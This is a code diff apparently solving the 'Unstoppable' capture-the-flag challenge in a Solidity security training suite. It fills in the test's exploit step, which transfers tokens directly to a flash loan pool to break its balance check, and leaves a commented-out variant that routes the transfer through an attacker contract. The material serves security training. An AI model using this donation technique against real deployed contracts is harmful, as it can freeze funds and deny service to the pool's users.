@@ -40,6 +40,25 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // USING PROXY CONTRACT TO SEND TOKENS
+
+        // const AttackerFactory = await ethers.getContractFactory('Attacker', attacker);
+        // const attackerContract = await AttackerFactory.deploy(this.token.address, this.pool.address);
+
+        // await this.token.transfer(attackerContract.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+
+        // await attackerContract.attack(INITIAL_ATTACKER_TOKEN_BALANCE);
+
+        // DIRECTLY SEND DVT TOKEN TO THE POOL
+
+        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+
+        const balanceOfPool = ethers.utils.parseEther('1000100');
+        
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.equal(balanceOfPool);
     });
 
     after(async function () {
